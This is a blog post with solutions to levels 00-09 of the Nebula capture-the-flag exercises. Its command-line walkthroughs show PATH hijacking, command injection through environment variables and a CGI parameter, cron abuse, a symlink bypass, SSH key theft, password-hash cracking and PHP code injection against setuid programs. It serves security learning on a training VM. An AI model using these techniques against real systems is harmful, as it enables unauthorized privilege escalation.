
<!DOCTYPE HTML>
<html>
<head>
	<meta charset="utf-8">
	<title>Nebula Shell Exploits (Solutions 00-09) - Louis Li</title>
	<meta name="author" content="Louis Li">

	
	<meta name="description" content="Nebula Shell Exploits (Solutions 00-09) Shell-based exploit exercises Overview Nebula is a series of “capture the flag” exercises from Exploit &hellip;">
	

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta property="fb:admins" content="100001696373537" />

	<link href="http://feeds.feedburner.com/louisligithub" rel="alternate" title="Louis Li" type="application/atom+xml">
	
	<link rel="canonical" href="http://louisrli.github.io/blog/2012/06/22/nebula0/">
	<link href="/favicon.png" rel="shortcut icon">
	<link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
	<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
        <script type="text/javascript"
            src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
          </script>
	<link href='http://fonts.googleapis.com/css?family=Open+Sans:400italic,400,700' rel='stylesheet' type='text/css'>
	<!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

</head>


<body>
	<div class="container">
		<div class="left-col">
			<div class="intrude-less">
			<header id="header" class="inner"><div class="profilepic">
	<script src="/javascripts/md5.js"></script>
	<script type="text/javascript">
		$(function(){
			$('.profilepic').append("<img src='http://www.gravatar.com/avatar/" + MD5("louisrli@gmail.com") + "?s=160' alt='Profile Picture' style='width: 160px;' />");
		});
	</script>
</div>
<hgroup>
  <h1><a href="/">Louis Li</a></h1>
  
</hgroup>

<p class="subtitle"></p>
<nav id="main-nav"><ul class="main-navigation">
  <li><a href="/blog">Blog</a></li>
  <li><a href="/blog/categories/projects">Sideprojects</a></li>
  <li><a href="/publications">Publications</a></li>
  <li><a href="http://github.com/louisrli">Github</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>


<section class="aboutme">
  <p>
    Harvard student and developer.
  </p>
</section>
</nav>
<nav id="sub-nav">
	<div class="social">
		
		
		<a class="google" href="https://plus.google.com/106125247318074050350" rel="author" title="Google+">Google+</a>
		
		
		
		<a class="github" href="https://github.com/louisrli" title="GitHub">GitHub</a>
		
		
		
		
		
		
		
		
		<a class="rss" href="http://feeds.feedburner.com/louisligithub" title="RSS">RSS</a>
		
	</div>
</nav>
</header>				
			</div>
		</div>	
		<div class="mid-col">
			
				
			
			<div class="mid-col-container">
				<div id="content" class="inner"><article class="post" itemscope itemtype="http://schema.org/BlogPosting">
	<h1 class="title" itemprop="name">Nebula Shell Exploits (Solutions 00-09)</h1>
        <h3 class="subtitle" itemprop="subtitle">Shell-based exploit exercises </h3>
	<div class="entry-content" itemprop="articleBody"><h1 id="overview">Overview</h1>

<p>Nebula is a series of “capture the flag” exercises from <a href="http://exploit-exercises.com/nebula">Exploit Exercises</a>. I’ve been reading <a href="http://www.amazon.com/Hacking-The-Art-Exploitation-Edition/dp/1593271441/">Hacking: The Art of Exploitation 2e</a> – this was a good supplement.</p>

<p>The provided Ubuntu VM has 20 levels (00 - 19). The goal of each level is to run the <code>getflag</code> command on a target account, either by exploiting a <a href="http://en.wikipedia.org/wiki/Setuid">suid</a> program or obtaining the password.</p>

<h1 id="solutions">Solutions</h1>

<p>To keep things shorter, a link to the full description is provided with each level. The full description contains relevant source code.</p>

<p>There’s no copy paste for Ubuntu Server VMs, but I included the output when it supplemented the solution.</p>

<h2 id="level-0">Level 0</h2>

<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level00">(full)</a>: Find a file with setuid permissions.</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>find / -perm /u+s</code></pre></div>

<p>Search the root directory for files based on permissions. The file <code>/bin/.../flag00</code> looks suspicious.</p>

<!-- more -->

<h2 id="level-1">Level 1</h2>

<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level01">(full)</a>: Given a program that calls <code>/usr/bin/env echo and now what?</code>, execute an arbitrary program.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>~:<span class="nv">$PATH</span>
<span class="gp">$</span> /bin/echo <span class="s2">&quot;whoami; getflag&quot;</span> &gt; ~/echo
<span class="gp">$</span> chmod a+x ~/echo
<span class="gp">$</span> /home/flag01/flag01</code></pre></div>

<p><code>env</code> looks in the <code>PATH</code> variable to find a program to run. Adding an executable named <code>echo</code> to an earlier directory in the path will execute the program.</p>

<h2 id="level-2">Level 2</h2>

<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level02">(full)</a>: Given a program that calls <code>/bin/echo $USER</code>, execute an arbitrary program.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">export </span><span class="nv">USER</span><span class="o">=</span><span class="s2">&quot;hi echoing; whoami; getflag&quot;</span>
<span class="gp">$</span> /home/flag02/flag02
<span class="go">about to call system(&quot;/bin/echo hi echoing; whoami; getflag is cool&quot;)</span>
<span class="go">hi echoing</span>
<span class="go">flag02</span>
<span class="go">You have successfully executed getflag on target account</span></code></pre></div>

<h2 id="level-3">Level 3</h2>

<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level03">(full)</a>: There is a <code>cron</code> job that runs occasionally. In the home directory, there is a <code>writable.sh</code> and a <code>writable.d/</code>.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">cd</span> /home/flag03
<span class="gp">$</span> ls
<span class="go">writable.d   writable.sh</span>

<span class="gp">$</span> <span class="c"># ./writable.sh runs a for loop with &quot;bash -x $i&quot; for i in writable.d/*</span>
<span class="gp">$</span> <span class="nb">echo</span> <span class="s2">&quot;whoami&quot;</span> &gt; /tmp/log<span class="p">;</span> getflag &gt;&gt; /tmp/log<span class="err">&quot;</span> &gt; ./writable.d/foo
<span class="gp">$</span> <span class="c"># Wait a few minutes for the cron job</span>
<span class="gp">$</span> cat /tmp/log
<span class="go">flag03</span>
<span class="go">You have successfully executed getflag on target account</span></code></pre></div>

<p>Since cron jobs don’t write output to <code>stdout</code>, the output should be logged in a file.</p>

<h2 id="level-4">Level 4</h2>
<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level04">(full)</a>: The program <code>flag04</code> dumps the contents of a file to stdout, unless there is a substring match with the string <code>"token"</code>. Examine the file <code>/home/flag04/token/</code>.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">cd</span> /tmp/
<span class="gp">$</span> ln -s /home/flag04/ ./foo
<span class="gp">$</span> <span class="nb">cd</span> /home/flag04/
<span class="gp">$</span> ./flag04 /tmp/foo</code></pre></div>

<p><code>token</code> contains the password to the <code>flag04</code> account. <code>su flag04</code> and capture the flag.</p>

<h2 id="level-5">Level 5</h2>
<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level05">(full)</a>: Exploit the directory permissions in <code>/home/flag05/</code>.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">cd</span> /home/flag05
<span class="gp">$</span> ls -la
<span class="gp">$</span> <span class="sb">`</span>/home/flag05<span class="sb">`</span> contains <span class="sb">`</span>.ssh<span class="sb">`</span> <span class="o">(</span>unreadable<span class="o">)</span> and <span class="sb">`</span>.backup<span class="sb">`</span> <span class="o">(</span>execute access!<span class="o">)</span> directories
<span class="gp">$</span> ls .backup
<span class="go">backup-19072011.tgz</span>
<span class="gp">$</span> <span class="c"># tar tzf backup-19072011.tgz shows that it contains the .ssh directory</span>
<span class="gp">$</span> <span class="nb">cd</span> .backup
<span class="gp">$</span> tar xzf backup-19072011.tgz -C ~
<span class="gp">$</span> <span class="nb">cd</span> ~/.ssh
<span class="gp">$</span> ssh -i id_rsa flag05@localhost
<span class="gp">flag05@nebula:~$</span> getflag</code></pre></div>

<p>The <code>-C</code> flag for <code>tar</code> switches directories before unarchiving. We then ssh to our own machine, but this time as <code>flag05</code>.</p>

<h2 id="level-6">Level 6</h2>
<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level06">(full)</a>: The <code>flag06</code> account credentials are from a legacy UNIX system.</p>

<p>Account credentials points toward <code>/etc/passwd</code>:</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> cat /etc/passwd/ <span class="p">|</span>  grep flag06
<span class="go">flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh</span></code></pre></div>

<p>According to the Internet, older UNIX systems stored the salted, hashed passwords in <code>/etc/passwd</code>. Now, these are placed in the no-read <code>/etc/shadow/</code> (or a variant). The <code>flag06</code> is a one way hash, but <a href="http://www.openwall.com/john/">John the Ripper</a> can crack it. No special permissions are required to use it.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">cd</span> ~
<span class="gp">$</span> wget http://www.openwall.com/john/g/john-1.7.9.tar.gz
<span class="gp">$</span> tar xzf john-1.7.9.tar.gz
<span class="gp">$</span> <span class="nb">cd </span>john-1.7.9.tar.gz/src
<span class="gp">$</span> make clean linux-x86-sse2
<span class="gp">$</span> <span class="nb">cd</span> ../run
<span class="gp">$</span> ./john /etc/passwd
<span class="go">Loaded 1 password hash (Traditional DES [128/128 BS SSE2])</span>
<span class="go">hello             (flag06)</span>
<span class="go">...</span>
<span class="gp">$</span> su flag06
<span class="go">Password:</span>
<span class="gp">sh-4.2$</span> getflag</code></pre></div>

<h2 id="level-7">Level 7</h2>
<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level07">(full)</a>: A Perl CGI script attempts to ping a given host.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">cd</span> /home/flag07
<span class="gp">$</span> perl index.cgi <span class="nv">Host</span><span class="o">=</span><span class="s2">&quot;google.com | getflag&quot;</span>
<span class="gp">$</span> <span class="c"># Yields a &quot;getflag is executing on a non-flag account, this doesn&#39;t count&quot;</span>
<span class="gp">$</span> cat thttpd.conf <span class="p">|</span> grep flag07
<span class="go">dir=/home/flag07</span>
<span class="go">user=flag07</span>
<span class="gp">$</span> ps aux <span class="p">|</span> grep thttpd
<span class="gp">$</span> <span class="c"># Interestingly, two thttpd web server instances are running on flag07 and flag16</span>
<span class="gp">$</span> cat thttpd.conf <span class="p">|</span> grep <span class="nv">port</span><span class="o">=</span>
<span class="go">port=7007</span>
<span class="gp">$</span> <span class="nb">cd</span> ~ <span class="o">&amp;&amp;</span> wget localhost:7007/index.cgi --post-data<span class="o">=</span><span class="s2">&quot;Host=google.com | getflag&quot;</span>
<span class="gp">$</span> cat index.cgi
<span class="go">&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;You have successfully executed getflag on a target account&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;</span></code></pre></div>

<p>If we run the script with <code>perl</code>, <code>getflag</code> still runs as the <code>level07</code> user. The vulnerability exists in <code>thttpd.conf</code>, which runs commands as <code>flag07</code> (<code>user=flag07</code>). Capturing the flag requires using <code>thttpd.conf</code>.</p>

<p><code>ps aux</code> shows that a web server using <a href="http://www.acme.com/software/thttpd/">thttpd</a> is running. Using <code>wget localhost:7007/index.cgi</code>, the parameter is passed in as the <code>flag07</code> user.</p>

<h2 id="level-8">Level 8</h2>
<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level08">(full)</a>: Examine a <code>capture.pcap</code> file to see what <code>flag08</code> was doing.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">cd</span> /home/flag08
<span class="gp">$</span> <span class="c"># -X prints in ASCII; -q removes extraneous information, -r points to a file</span>
<span class="gp">$</span> tcpdump -X -q -r capture.pcap <span class="p">|</span> less</code></pre></div>

<p>After mucking around with <code>tcpdump</code> in ASCII mode, however, it’s clear that the output is still unintelligible. The Internet (broadly speaking) suggests Wireshark (and its command line counterpart, <code>tshark</code>) to examine packets, but the virtual machine doesn’t have these. However, a program named <code>tcpflow</code> is available.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="c"># -c prints to stdout, -r points to a file</span>
<span class="gp">$</span> tcpflow -c -r capture.pcap <span class="p">|</span> less</code></pre></div>

<p>After the <code>Password:</code> prompt, the <code>flag08</code> user typed “backdoor…00Rm8.ate”. A few tries for <code>su flag08</code> with <code>backdoor</code> and <code>backdoor...00Rm8.ate</code> are unsuccessful. But if we believe that:
1. the password is based on words
2. each packet represents a key press to the server
“Backdoor mate” could be <code>backdoorm8</code>, <code>backd00Rm8</code>, etc. If the period represents deletion, then the password is <code>backd00Rmate</code>.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> su flag08
<span class="go">Password:</span>
<span class="gp">sh-4.2$</span> getflag</code></pre></div>

<h2 id="level-9">Level 9</h2>
<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level09">(full)</a>: Exploit a C wrapper for a PHP script. The PHP script uses one argument but accepts a second, unused one – <code>$useme</code>.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">cd</span> ~
<span class="gp">$</span> <span class="nb">echo</span> <span class="s2">&quot;[email {\$use_me(getflag)}]&quot;</span> &gt; foo
<span class="gp">$</span> /home/flag09/flag09 ./foo <span class="nb">exec</span>
<span class="go">[error]</span>
<span class="go">You have successfully executed getflag on target account</span></code></pre></div>

<p>This exploits PHP’s “variable of variables.” Executing <code>flag09 ~/foo system</code> also works.</p>
</div>

</article>

	<div class="share">
  <!--AddThis Button BEGIN -->
  <div class="addthis_toolbox addthis_default_style addthis_32x32_style">
    <a class="addthis_button_preferred_1"></a>
    <a class="addthis_button_preferred_2"></a>
    <a class="addthis_button_preferred_3"></a>
    <a class="addthis_button_preferred_4"></a>
    <a class="addthis_button_compact"></a>
    <a class="addthis_counter addthis_bubble_style"></a>
  </div>
  <script type="text/javascript">var addthis_config = {"data_track_addressbar":true};</script>
  <script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-51e5a5762f46bbe9"></script>
  <!-- AddThis Button END -->
</div>



<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- Leaderboard -->
<ins class="adsbygoogle"
  style="display:inline-block;width:728px;height:90px"
  data-ad-client="ca-pub-5225926150102880"
  data-ad-slot="1968553857"></ins>
<script>
  (adsbygoogle = window.adsbygoogle || []).push({});
</script>


<section id="comment">
    <h1 class="title">Comments</h1>
    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
</div>
</section>

</div>
			</div>
			<footer id="footer" class="inner"><p>
  Copyright &copy; 2015 - Louis Li -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

Design credit: <a href="http://shashankmehta.in/archive/2012/greyshade.html">Shashank Mehta</a></footer>
			<script src="/javascripts/slash.js"></script>
<script src="/javascripts/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
	$('.fancybox').fancybox();
})(jQuery);
</script> <!-- Delete or comment this line to disable Fancybox -->


<script type="text/javascript">
      var disqus_shortname = 'llgithub';
      
        
        // var disqus_developer = 1;
        var disqus_identifier = 'http://louisrli.github.io/blog/2012/06/22/nebula0/';
        var disqus_url = 'http://louisrli.github.io/blog/2012/06/22/nebula0/';
        var disqus_script = 'embed.js';
      
    (function () {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    }());
</script>



	<script type="text/javascript">
		var _gaq = _gaq || [];
		_gaq.push(['_setAccount', 'UA-32823730-1']);
		_gaq.push(['_trackPageview']);

		(function() {
			var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
			ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
			var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
		})();
	</script>




		</div>
	</div>
</body>
</html>
